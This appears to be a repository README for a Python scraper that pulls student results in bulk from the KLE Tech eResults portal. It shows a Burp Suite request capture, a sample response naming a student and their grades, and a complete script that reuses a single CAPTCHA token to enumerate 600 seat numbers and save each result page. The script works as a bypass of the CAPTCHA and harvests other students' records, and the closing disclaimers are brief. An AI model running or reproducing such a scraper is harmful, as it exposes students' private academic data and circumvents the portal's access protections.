#  KLE Tech eResults Scraper Script

##  Automating Student Results Retrieval

### **Overview**
This script automates the process of retrieving student results from the [KLE Tech eResults](https://eresults.kletech.ac.in) portal. By leveraging a **persistent CAPTCHA token**, it allows users to fetch multiple student records efficiently.

This tool is designed for **data aggregation and analysis**, making it easier to collect academic data for legitimate purposes such as result analysis and trend observation.

---

##  **Use Case**
- **Batch Fetching**: Automates the retrieval of student results without repeated CAPTCHA solving.
- **Data Collection**: Useful for academic data analysis, grade tracking, and institutional research.
- **Efficiency**: Saves time by eliminating the need for manually entering each University Seat Number (USN).

---

##  **How the Script Works**
1. **User enters the CAPTCHA value** once at the start.
2. **Loops through all USNs** in a defined range (`01fe22bcs001` → `01fe22bcs300`, `01fe22bci001` → `01fe22bci300`).
3. **Reuses the same CAPTCHA** for each request.
4. **Saves each student's HTML response locally** for further analysis.

---

##  **Burp Suite Request & Response Analysis**

### 🔹 **Sample Request Sent to Server**
```http
POST /index.php?option=com_examresult&task=getResult HTTP/1.1
Host: eresults.kletech.ac.in
Cookie: _ga_HLWRDTM589=GS1.1.1741269540.1.1.1741270344.0.0.0; _ga=GA1.3.2076330253.1741269541
Content-Length: 56
Origin: https://eresults.kletech.ac.in
Content-Type: application/x-www-form-urlencoded
Referer: https://eresults.kletech.ac.in/index.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Connection: keep-alive

usn=01fe22bcs110&osolCatchaTxt=REBLB&osolCatchaTxtInst=0
```

### 🔹 **Expected Response Format**
```html
<html>
  <body>
    <h3>Student Name: Rohit M R</h3>
    <table>
      <tr><td>Machine Learning</td><td>A</td></tr>
      <tr><td>Data Structures</td><td>B</td></tr>
    </table>
  </body>
</html>
```
---

##  **Python Scraper Script**
```python
import requests

base_url = "https://eresults.kletech.ac.in/index.php"
session = requests.Session()

captcha_value = input("Enter CAPTCHA value: ").strip()
start_usn = 1
end_usn = 300

for series in ["01fe22bcs", "01fe22bci"]:
    for i in range(start_usn, end_usn + 1):
        usn = f"{series}{i:03d}"
        data = {
            "usn": usn,
            "osolCatchaTxt": captcha_value,
            "osolCatchaTxtInst": "0",
        }

        response = session.post(
            f"{base_url}?option=com_examresult&task=getResult",
            data=data
        )

        if "Wrong CAPTCHA" in response.text:
            print(f" CAPTCHA expired. Try again.")
            break

        with open(f"{usn}.html", "w", encoding="utf-8") as file:
            file.write(response.text)

        print(f" Saved: {usn}.html")
```

---

##  **Best Practices & Responsible Usage**
- Ensure compliance with **institutional data policies** before running the script.
- Use this script for **legitimate academic purposes** only.
- Be mindful of **server load** and avoid excessive requests.

---

## ⚠️ **Disclaimer**
This script is intended for **educational and academic research purposes** only. Unauthorized data collection or access may violate institutional and legal policies. Always seek permission before running automated tools on web portals.

